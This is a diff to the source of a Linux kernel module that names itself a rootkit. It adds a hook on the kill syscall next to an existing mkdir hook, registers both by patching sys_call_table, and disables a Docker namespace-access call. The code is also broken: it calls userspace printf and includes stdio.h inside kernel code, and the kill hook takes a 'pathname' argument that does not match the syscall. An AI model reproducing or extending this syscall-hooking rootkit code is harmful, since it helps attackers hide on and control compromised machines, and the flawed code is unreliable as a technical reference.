@@ -54,6 +54,8 @@
 #include <linux/uts.h>
 #include <linux/user_namespace.h>
 
+#include <stdio.h>
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
 
@@ -473,6 +475,7 @@ asmlinkage long asm_rmdir(const char __user *pathname)
 /*
  * New hooked functions:
  * - mkdir
+ * - kill
  *
 */
 asmlinkage long asm_mkdir(const char __user *pathname)
@@ -482,9 +485,22 @@ asmlinkage long asm_mkdir(const char __user *pathname)
     long ret = original_mkdir(pathname);
     asm_hook_patch(asm_mkdir);
     pr_info("Hello world from rootkit mkdir!\n");
+    printf("Hello world from rootkit mkdir!\n");
     return ret;
 }
 
+asmlinkage long asm_kill(const char __user *pathname)
+{
+    asmlinkage long (*original_kill)(const char __user *);
+    original_kill = asm_hook_unpatch(asm_kill);
+    long ret = original_kill(pathname);
+    asm_hook_patch(asm_kill);
+    pr_info("Hello world from rootkit kill!\n");
+    printf("Hello world from rootkit kill!\n");
+    return ret;
+}
+
+// ========== END NEW HOOKED FUNCTIONS ==============
 
 // ========== PID LIST ==========
 
@@ -1165,14 +1181,15 @@ int init(void)
      */
     asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
     asm_hook_create(sys_call_table[__NR_mkdir], asm_mkdir);
+    asm_hook_create(sys_call_table[__NR_kill], asm_kill);
 
     /* Hook read() and write() syscalls with our own */
     hook_create(&sys_call_table[__NR_read], read);
     hook_create(&sys_call_table[__NR_write], write);
 
     /* Functions to work with Docker containers */
-    //list_tasks();
-    access_namespaces();
+    //list_tasks(); (not used for now)
+    //access_namespaces();
 
     return 0;
 }
